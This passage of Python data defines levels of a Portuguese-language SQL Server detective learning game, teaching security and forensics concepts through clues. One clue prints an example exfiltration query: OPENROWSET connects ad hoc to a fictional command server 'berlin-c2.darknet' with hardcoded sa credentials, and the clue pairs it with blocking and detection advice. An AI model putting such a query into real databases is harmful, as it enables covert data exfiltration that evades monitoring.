                            "- Habilitar TDE como camada adicional\n\n"
                            "🔍 **Pista:** Destino: `berlin-srv01` — localização confirmada!"
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    {
                        "id": "ber_s2", "level": "senior", "icon": "🌀",
                        "title": "OPENROWSET para Conexão Ad-hoc",
                        "short": "Exfiltração sem Linked Server — mais difícil de detectar",
                        "narrative": "Query com OPENROWSET encontrada no histórico de execução:",
                        "sql": (
                            "-- Exfiltração via OPENROWSET — sem Linked Server!\n"
                            "SELECT * FROM OPENROWSET(\n"
                            "  'SQLNCLI',\n"
                            "  'Server=berlin-c2.darknet;UID=sa;PWD=h4ck3r;',\n"
                            "  'SELECT @@VERSION'\n"
                            ")\n"
                            "-- Conexão ad-hoc — não fica em sys.servers!"
                        ),
                        "explanation": (
                            "**OPENROWSET — conexão ad-hoc entre servidores**\n\n"
                            "`OPENROWSET` conecta a fontes externas sem Linked Server permanente. "
                            "Não deixa registro em `sys.servers` — mais difícil de detectar.\n\n"
                            "**Para bloquear:** `sp_configure 'Ad Hoc Distributed Queries', 0`\n\n"
                            "**Detectar:** Extended Events monitorando `OPENROWSET`.\n\n"
                            "🔍 **Pista:** `berlin-c2.darknet` resolve para IP em Kreuzberg."
                        ),
                        "learns_fact": "sign", "fact_value": "Escorpião",
                    },
                    {
                        "id": "ber_s3", "level": "senior", "icon": "🚨",
                        "title": "fn_dblog — Forensics do Transaction Log",
                        "short": "Leitura do log de transações reconstrói todas as ações do atacante",
                        "narrative": "O perito forense usou esta query para reconstruir o ataque completo:",
                        "sql": (
                            "-- Forensics do transaction log!\n"
                            "SELECT [Current LSN], Operation,\n"
                            "       [Transaction Name], [Begin Time]\n"
                            "FROM fn_dblog(NULL, NULL)\n"
                            "WHERE Operation IN\n"
                            "      ('LOP_INSERT_ROWS','LOP_DELETE_ROWS')\n"
                            "ORDER BY [Begin Time] DESC\n"
                            "-- Reconstrói CADA ação do atacante!"
                        ),
                        "explanation": (
                            "**fn_dblog — o detetive do transaction log**\n\n"
                            "`sys.fn_dblog` lê o transaction log ativo, permitindo reconstruir "
                            "**cada operação** realizada, mesmo após rollback.\n\n"
                            "É a ferramenta mais poderosa de forensics do SQL Server — desde que "
                            "o log não tenha sido sobrescrito.\n\n"
                            "Para logs de backups anteriores: use `sys.fn_dump_dblog`.\n\n"
                            "🎯 **Caso completo! PRENDA O SUSPEITO!**"
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                ],
                "travel_options": [],
                "is_final": True,
            },
        ],
    }
]
